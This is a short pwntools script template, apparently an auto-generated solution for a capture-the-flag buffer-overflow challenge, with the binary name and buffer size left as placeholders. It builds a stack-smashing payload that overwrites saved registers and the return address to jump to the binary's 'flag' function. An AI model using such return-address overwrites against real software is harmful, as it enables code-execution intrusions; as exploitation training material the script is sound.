from pwn import *

gen_filename = ""
gen_templates = {}

e = ELF(gen_filename)
p = e.process()
p.readline()

dest = e.symbols["flag"]

B = gen_templates["B"]

payload = b""
payload += B * b"a"  # buffer
payload += 4 * b"b"  # ebp
payload += 4 * b"c"  # ebx
payload += 4 * b"d"  # padding
payload += p32(dest)  # eip
p.sendline(payload)

print(p.readlineS())
